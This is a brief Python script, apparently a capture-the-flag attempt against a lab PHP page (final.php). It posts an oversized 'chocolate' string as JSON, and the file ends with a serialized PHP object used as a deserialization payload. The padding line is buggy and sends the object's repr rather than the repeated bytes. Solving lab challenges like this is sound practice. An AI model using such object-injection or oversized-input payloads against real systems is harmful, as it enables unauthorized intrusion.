# http://eci-2zegzaz5l01s0yi0n228.cloudeci1.ichunqiu.com/final.php

# cocoaLiquor=123&cocoaButter=123&darkCocoaPowder=123&powderedSugar=111

import requests
from io import BytesIO

# 要发送POST请求的网址
url = 'http://eci-2zegzaz5l01s0yi0n228.cloudeci1.ichunqiu.com/final.php'

# POST请求的头部信息
headers = {
    'Content-Type': 'application/json'
}

str1 = BytesIO(b'chocolate'+b'chocolate'*100000)

data = {
	'food': str(str1),
}


response = requests.post(url,headers=headers, json=data)

cc = response.content

print(str(cc,encoding="utf-8"))

O:9:"chocolate":2:{s:3:"cat";s:3:"abc";s:5:"kitty";s:3:"abc";}